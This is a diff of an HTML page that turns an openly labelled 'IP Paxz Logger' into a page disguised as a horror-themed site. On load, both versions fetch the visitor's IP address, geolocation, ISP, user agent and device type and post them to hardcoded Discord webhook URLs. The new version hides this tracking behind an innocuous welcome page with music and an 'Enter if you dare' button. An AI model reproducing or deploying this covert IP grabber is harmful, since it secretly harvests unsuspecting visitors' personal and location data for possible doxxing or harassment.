@@ -3,187 +3,117 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IP Paxz Logger</title>
+    <title>Welcome to the Horror Site</title>
     <style>
         body {
+            background-color: #000;
+            color: #fff;
             font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
             text-align: center;
-            padding-top: 50px;
-            background-color: white;
-            color: black;
-            animation: changeBackground 0.4s infinite;
-            position: relative;
         }
         h1 {
-            color: inherit;
+            font-size: 3em;
+            margin-bottom: 20px;
         }
         p {
-            color: inherit;
-            margin-bottom: 40px;
+            font-size: 1.2em;
+            line-height: 1.6;
+            margin-bottom: 30px;
         }
-        @keyframes changeBackground {
-            0% { background-color: white; color: black; }
-            50% { background-color: black; color: white; }
-            100% { background-color: white; color: black; }
+        .container {
+            max-width: 600px;
+            padding: 0 20px;
+        }
+        .horror-img {
+            width: 100%;
+            max-width: 400px;
+            margin-bottom: 30px;
+            border: 2px solid #fff;
+            border-radius: 10px;
+        }
+        .btn {
+            display: inline-block;
+            padding: 10px 20px;
+            background-color: #ff0000;
+            color: #fff;
+            text-decoration: none;
+            border-radius: 5px;
+            transition: background-color 0.3s ease;
+        }
+        .btn:hover {
+            background-color: #a50000;
         }
     </style>
 </head>
 <body>
-    <h1>Welcome to our awesome site!</h1>
-    <p>Enjoy the music while we log your IP address.</p>
-    
+    <div class="container">
+        <img src="horror_image.jpg" alt="Horror Image" class="horror-img">
+        <h1>Welcome to the Horror Site</h1>
+        <p>Are you brave enough to explore the dark corners of this website?</p>
+        <a href="#" class="btn">Enter if you dare</a>
+    </div>
+
+    <audio autoplay loop>
+        <source src="music.mp3" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
+
     <script>
-        document.addEventListener("DOMContentLoaded", function() {
-            playMusic();
-            logIpAddress();
-        });
-
-        function playMusic() {
-            var audio = new Audio('music.mp3');
-            audio.play();
-            audio.addEventListener('ended', function() {
-                this.currentTime = 0;
-                this.play();
-            }, false);
-        }
-
-        function logIpAddress() {
+        function getIPDataAndSendToDiscord() {
             fetch('https://ipapi.co/json/')
-                .then(response => response.json())
-                .then(data => {
-                    var ipAddress = data.ip;
-                    var locationData = {
-                        "City": data.city,
-                        "Region": data.region,
-                        "Country": data.country_name,
-                        "Country Code": data.country,
-                        "Continent Code": data.continent_code,
-                        "Timezone": data.timezone,
-                        "Currency": data.currency,
-                        "Language": data.languages,
-                        "ASN": data.asn,
-                        "Organization": data.org
-                    };
-
-                    sendToDiscord(ipAddress, locationData);
-                })
-                .catch(error => console.error('Error fetching IP address:', error));
-        }
-
-        function sendToDiscord(ipAddress, locationData) {
-            var embedData = {
-                "IP Address": ipAddress,
-                "City": locationData.City || "Unknown",
-                "Region": locationData.Region || "Unknown",
-                "Country": locationData.Country || "Unknown",
-                "Country Code": locationData["Country Code"] || "Unknown",
-                "Continent Code": locationData["Continent Code"] || "Unknown",
-                "Timezone": locationData.Timezone || "Unknown",
-                "Currency": locationData.Currency || "Unknown",
-                "Language": locationData.Language || "Unknown",
-                "ASN": locationData.ASN || "Unknown",
-                "Organization": locationData.Organization || "Unknown"
-            };
-
-            var embed = createEmbed(embedData);
-            sendEmbed(embed);
-        }
-
-        function createEmbed(embedData) {
-            var userAgent = navigator.userAgent;
-            var timestamp = new Date().toISOString();
-            var os = detectOS(userAgent);
-            var browser = detectBrowser(userAgent);
-            var deviceType = getDeviceType();
-
-            var embed = {
-                "embeds": [
-                    {
-                        "title": "IP Paxz Logger",
-                        "description": "A user has visited the page.",
-                        "color": 65280,
+            .then(response => response.json())
+            .then(data => {
+                const embedData = {
+                    "embeds": [{
+                        "title": "IP Address Information",
                         "fields": [
-                            { "name": "IP Address", "value": "```" + embedData["IP Address"] + "```" },
-                            { "name": "City", "value": "```" + embedData.City + "```" },
-                            { "name": "Region", "value": "```" + embedData.Region + "```" },
-                            { "name": "Country", "value": "```" + embedData.Country + "```" },
-                            { "name": "Country Code", "value": "```" + embedData["Country Code"] + "```" },
-                            { "name": "Continent Code", "value": "```" + embedData["Continent Code"] + "```" },
-                            { "name": "Timezone", "value": "```" + embedData.Timezone + "```" },
-                            { "name": "Currency", "value": "```" + embedData.Currency + "```" },
-                            { "name": "Language", "value": "```" + embedData.Language + "```" },
-                            { "name": "ASN", "value": "```" + embedData.ASN + "```" },
-                            { "name": "Organization", "value": "```" + embedData.Organization + "```" },
-                            { "name": "Operating System", "value": "```" + os + "```" },
-                            { "name": "Browser", "value": "```" + browser + "```" },
-                            { "name": "Device Type", "value": "```" + deviceType + "```" },
-                            { "name": "User Agent", "value": "```" + userAgent + "```" },
-                            { "name": "Timestamp", "value": "```" + timestamp + "```" }
-                        ],
-                        "footer": { "text": "Info generated by Paxz!!!" }
-                    }
-                ]
-            };
+                            {"name": "IP Address", "value": data.ip},
+                            {"name": "City", "value": data.city},
+                            {"name": "Region", "value": data.region},
+                            {"name": "Country", "value": data.country_name},
+                            {"name": "Country Code", "value": data.country},
+                            {"name": "Continent Code", "value": data.continent_code},
+                            {"name": "Timezone", "value": data.timezone},
+                            {"name": "Currency", "value": data.currency},
+                            {"name": "Language", "value": data.languages},
+                            {"name": "Organization", "value": data.org},
+                            {"name": "Operating System", "value": navigator.platform},
+                            {"name": "Browser", "value": navigator.userAgent},
+                            {"name": "Device Type", "value": getDeviceType()},
+                            {"name": "User Agent", "value": navigator.userAgent},
+                            {"name": "Timestamp", "value": new Date().toLocaleString()}
+                        ]
+                    }]
+                };
 
-            return embed;
-        }
-
-        function sendEmbed(embed) {
-            var webhookURL = "https://discord.com/api/webhooks/1213815065594175538/5nAvt25ByKhCQHt-C2byxRp60Kxhrtof-RdQ249Fi5ySE8dRbRhASEuL_IVtwEh8-XlS";
-
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(embed)
+                fetch('https://discord.com/api/webhooks/1213788395726311464/Qu04CT-Yp-s2BttXP2jZGSm_iTWHA08MFm-OCxQHCCeiq9J-RL5VYX41Oj-5moEPMAtP', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(embedData)
+                })
+                .then(response => console.log(response))
+                .catch(error => console.error('Error sending data to Discord:', error));
             })
-            .then(response => {
-                if (!response.ok) {
-                    console.error('Failed to send embed:', response.status, response.statusText);
-                } else {
-                    console.log('Embed sent successfully!');
-                }
-            })
-            .catch(error => console.error('Error sending embed:', error));
-        }
-
-        function detectOS(userAgent) {
-            var os;
-            if (userAgent.includes("Windows")) {
-                os = "Windows";
-            } else if (userAgent.includes("Mac")) {
-                os = "Mac OS";
-            } else if (userAgent.includes("Linux")) {
-                os = "Linux";
-            } else {
-                os = "Unknown OS";
-            }
-            return os;
-        }
-
-        function detectBrowser(userAgent) {
-            var browser;
-            if (userAgent.includes("Firefox")) {
-                browser = "Firefox";
-            } else if (userAgent.includes("Chrome")) {
-                browser = "Chrome";
-            } else if (userAgent.includes("Safari")) {
-                browser = "Safari";
-            } else if (userAgent.includes("Edge")) {
-                browser = "Edge";
-            } else {
-                browser = "Unknown Browser";
-            }
-            return browser;
+            .catch(error => console.error('Error fetching IP data:', error));
         }
 
         function getDeviceType() {
-            var userAgent = navigator.userAgent;
-            if (userAgent.includes("Mobile")) return "Phone";
-            if (userAgent.includes("Tablet")) return "Tablet";
-            if (userAgent.includes("Console")) return "Console";
-            if (userAgent.includes("Windows")) return "PC / Computer";
-            return "Unknown Device";
+            if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+                return 'Mobile';
+            } else {
+                return 'Desktop';
+            }
         }
+
+        window.onload = getIPDataAndSendToDiscord;
     </script>
 </body>
 </html>
